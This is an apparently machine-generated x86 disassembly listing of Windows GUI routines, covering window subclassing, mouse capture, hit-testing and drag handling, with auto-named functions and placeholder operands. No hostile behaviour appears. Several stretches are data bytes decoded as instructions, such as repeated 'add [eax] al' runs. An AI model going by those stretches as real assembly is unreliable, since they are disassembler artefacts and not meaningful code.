inc ebx
add [ edx ] ah
inc ebx
add [ eax + 0x4381 ] dh
mov [ 0xffffffffa3080043 ] al
inc ebx
add al bh
retn
sub_4318fe
inc ecx
add [ eax + 0x7c004033 ] ah
lds eax [ ecx ]
test al 0x33
inc eax
add [ 0x30fc0043 ] dl
inc eax
add [ eax ] bl
xor [ eax ] eax
fmul st2
inc ebx
add ah dh
jno r-xdata
inc ebx
add [ eax ] ah
push esp
inc ebx
add [ eax - 0x63ffbcbd ] bl
inc ebx
inc ebx
add [ ebx + esi * 2 + 0x73b80043 ] cl
inc ebx
add ah bl
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add al ah
dec edi
inc ebx
add ah dh
push edx
inc ebx
add [ eax - 0x7fffbcaf ] ah
arpl [ ebx ] ax
cmp al 0x74
inc ebx
add al ah
push ebp
inc ebx
add [ eax + 0x56 ] cl
inc ebx
add al cl
inc esi
inc ebx
add [ esi + edx * 2 ] dh
inc ebx
add al al

add ah ch
inc ebx
add [ eax + esi * 2 + 0x71bc0041 ] bh
inc ebx
add ah bl
inc ebp
inc ebx
add [ eax + 0x45 ] cl
inc ebx
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add [ edx + ecx * 8 + 0x43 ] bh
add [ eax + 0x60800043 ] al
inc ebx
add [ eax + 0x61 ] dl
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ ebx + ecx * 2 + 0x4af80043 ] dl
sub_431ccc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x1d
inc ebx
add [ eax ] ch
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_431dbc
pushfd
sbb eax 0x1da60043
inc ebx
add [ eax + 0x2100431d ] dh
sbb eax 0x1d290043
inc ebx
add [ ecx ] dh
sbb eax 0x1d390043
inc ebx
add [ esi + 0x1d ] al
inc ebx
add [ ebx + 0x1d ] dl
inc ebx
add [ eax + 0x1d ] ah
inc ebx
add [ ebp + 0x1d ] ch
inc ebx
add [ edx + 0x1d ] bh
inc ebx
add [ edi - 0x6bffbce3 ] al
sbb eax 0x10043
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x1dbce870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] ah
inc ebx
add ah dh
sbb eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi ] ds
inc ebx
add [ eax ] bh
add [ eax ] al
or al 0x12
inc eax
add [ ebx + esi + 0x57dc0040 ] dl
inc eax
add al ch
push edi
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
clc
push edi
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0xde
inc ebx
add [ eax - 0x22 ] ch
inc ebx
add al ah
fild [ ebx ]
sub_431f00
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_431fb8
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_431fec
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40435c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_431fb8
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_432048
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43222c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c0d0
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4043bc
mov eax edi
mov edx esi
call sub_403ef0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_432270
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c0d0
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4043bc
mov eax edi
mov edx esi
call sub_403ef0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4322dc
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
mov eax ebx
call sub_43b8e8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_432324
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
xor [ eax ] eax
pushfd
imul eax [ ecx ] sub_416b40
sub [ ebp + 0x41 ] ch
add [ eax + 0x24 ] al
inc ebx
add [ edx + ebp * 2 + 0x41 ] ch
add [ ecx ] cl
push esp
push ebx
imul esi [ ebp + 0x4c ] 0x8b747369
rcl [ ebx + 0x56 ] 0x57
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x6bffbeb9 ] dh
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_416b18
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_432388
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_416b18
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_4323bc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b8e8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_4323e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_402734
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_4323bc
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_432388
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4169bc
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416b94
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432440
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4169f0
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_416b18
mov edx 0x8
call sub_402754
inc esi
dec ebx
jne r-xdata
sub_432474
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_416b18
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_432388
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_4324d8
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_432538
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030b4
mov edx esp
mov eax esi
call sub_404100
add esp 0x100
pop esi
pop ebx
retn
sub_432574
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43263e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_433694
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43301c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f4
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43301c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_433694
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43301c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_433694
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_432643
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_433694
sub_43269c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4326c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43272c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4324d8
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_432758
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403360
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_432784
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403360
xor edx edx
sub_4327dc
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43d458
sub_4327fc
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43d440
sub_432820
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_432708
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb18
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_424ba4
mov edx eax
mov eax esi
call sub_41fc94
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_432884
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4328b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43272c
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_432910
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403360
pop edi
pop esi
pop ebp
retn 0x4
sub_432934
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_432958
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_432934
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_432934
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_432a14
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_432a80
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_432ed0
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_431fec
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43b8e8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43b8e8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43b8e8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403360
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_432a14
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43b8e8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43b8e8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_432c18
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43b8e8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43b8e8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_432c5c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_432474
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_432a80
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_416b18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43b8e8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_432c18
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403360
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43a418
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4323e4
sub_432db8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_416b74
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_416a08
mov edx edi
mov eax [ rw-data ]
call sub_4169bc
jmp r-xdata
sub_432e18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_432e70
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40435c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_431fb8
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_432ed0
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_432e70
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_432efc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_432c5c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_432ed0
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_432e18
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43b8e8
mov [ esi ] eax
sub_432f4c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_432e18
cmp eax 0x1
sbb eax eax
inc eax
sub_432f88
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_43a384
test eax eax
je r-xdata
mov eax esi
call sub_43a384
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_4339b8
mov ebx eax
jmp r-xdata
xor edx edx
